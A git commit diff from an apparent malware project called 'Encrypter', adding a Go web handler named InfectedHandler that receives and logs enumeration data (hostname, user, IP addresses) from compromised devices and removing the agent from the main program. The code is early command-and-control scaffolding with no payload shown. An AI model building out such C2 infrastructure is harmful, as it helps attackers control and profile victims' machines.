746920732ff1cfd3f98856a6ffe87c2948f02df0
Joel <joelbdev@gmail.com>
2022-03-06 14:29:40 +1100

    pulled the agent into a seperate codebase

--- Webserver/WebServer.go
+++ Webserver/WebServer.go
@@ -1,9 +1,19 @@
 package Webserver
 
 import (
+	"encoding/json"
+	"fmt"
+	"io/ioutil"
 	"log"
 	"net/http"
 )
+
+type Enumeration struct {
+	ID       int      `json:"ID"`
+	Hostname string   `json:"Hostname"`
+	User     string   `json:"User"`
+	IP       []string `json:"IP"`
+}
 
 func HomeHandler(writer http.ResponseWriter, request *http.Request) {
 	defaultMessage := []byte("Listening for incoming connections ")
@@ -19,6 +29,18 @@ func InfectedHandler(writer http.ResponseWriter, request *http.Request) {
 	//this is where registered devices are kept - receives the JSON
 	//eventually this should append to a database
 	//sends a command response - tied to Agent.RegisterHost()
+
+	var device Enumeration
+	//receive the JSON
+	req, err := ioutil.ReadAll(request.Body)
+	if err != nil {
+		log.Fatalf("Issue getting enumeration data from device: %s", err)
+	}
+	json.Unmarshal([]byte(req), &device)
+	log.Printf("Enrolled a new device: %d", device.ID)
+
+	//placeholder, just print the struct
+	fmt.Println(device)
 }
 
 func CommandHandler(writer http.ResponseWriter, request *http.Request) {
--- main.go
+++ main.go
@@ -1,7 +1,6 @@
 package main
 
 import (
-	"Encrypter/Agent"
 	"Encrypter/Webserver"
 	"log"
 	"net/http"
@@ -14,9 +13,6 @@ func main() {
 	http.HandleFunc("/commands", Webserver.CommandHandler)
 
 	err := http.ListenAndServe("localhost:8080", nil)
-	log.Fatalf("Webserver run issue: %s", err)
-
-	//Run agent
-	Agent.Init()
+	log.Fatalf("Webserver runtime issue: %s", err.Error())
 
 }
